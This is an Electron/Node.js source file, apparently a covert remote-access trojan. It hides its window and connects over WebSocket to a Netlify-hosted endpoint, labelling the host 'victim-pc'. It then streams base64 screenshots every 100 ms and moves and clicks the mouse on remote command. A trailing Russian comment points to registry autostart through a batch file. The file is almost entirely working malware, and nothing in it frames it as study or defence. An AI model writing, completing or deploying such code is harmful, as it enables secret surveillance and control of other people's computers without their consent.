// main.js
const { app, BrowserWindow, screen } = require('electron');
const WebSocket = require('ws');
const robot = require('robotjs');

let ws;
function connect() {
  ws = new WebSocket('wss://your-netlify-site.netlify.app/.netlify/functions/websocket', {
    headers: { 'client-id': 'victim-pc' }
  });

  ws.on('message', (data) => {
    const cmd = JSON.parse(data);
    if (cmd.type === 'mouse') {
      robot.moveMouse(cmd.x * screen.getPrimaryDisplay().workAreaSize.width, 
                     cmd.y * screen.getPrimaryDisplay().workAreaSize.height);
      if (cmd.click) robot.mouseClick();
    }
  });

  setInterval(() => {
    const screenshot = robot.screen.capture();
    ws.send(JSON.stringify({
      type: 'screen',
      image: screenshot.image.toString('base64'),
      width: screenshot.width,
      height: screenshot.height
    }));
  }, 100);
}

app.whenReady().then(() => {
  const win = new BrowserWindow({ show: false });
  win.hide();
  connect();
});

// Автозагрузка через реестр (батник)